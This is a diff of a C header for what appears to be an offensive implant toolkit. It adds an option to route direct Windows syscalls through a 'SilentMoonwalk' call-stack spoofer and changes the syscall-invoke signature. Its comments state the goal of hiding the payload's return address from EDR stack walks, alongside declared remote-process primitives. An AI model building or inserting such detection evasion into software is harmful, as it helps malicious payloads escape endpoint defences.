@@ -9,6 +9,12 @@
  *
  * Everything is guarded by _WIN64; on other architectures the declarations
  * vanish and consumers must fall back to Win32 APIs (see NTSYS_HAVE).
+ *
+ * Defining NTSYS_SMW at build time additionally routes every <=8-argument
+ * syscall through the vendored SilentMoonwalk desync spoofer (../smw) so an
+ * EDR stack walk sees a kernelbase/kernel32/ntdll thread-root frame instead
+ * of the payload's own return address. The SMW sources must be compiled and
+ * linked alongside ntsys.c in that case; x64 only.
  */
 
 #ifndef COMMON_NTSYS_H
@@ -46,9 +52,13 @@ int ntsys_ready(void);
  * Run the syscall for `ssn` through the gadget with up to 11 arguments
  * (4 register + 7 stack, matching the Win64 syscall convention). Returns
  * rax (NTSTATUS in the low 32 bits).
+ *
+ * `argc` is the number of live entries in `args` and is required to route
+ * through SilentMoonwalk (see NTSYS_SMW below), whose desync stub accepts at
+ * most 8 arguments; wider syscalls always use the plain gadget path.
  */
 long ntsys_invoke(unsigned int ssn, uintptr_t gadget,
-                  const unsigned long long *args /* [11] */);
+                  const unsigned long long *args /* [11] */, int argc);
 
 /* Remote-process primitives built on the syscalls above. All return TRUE
  * on NT_SUCCESS. */
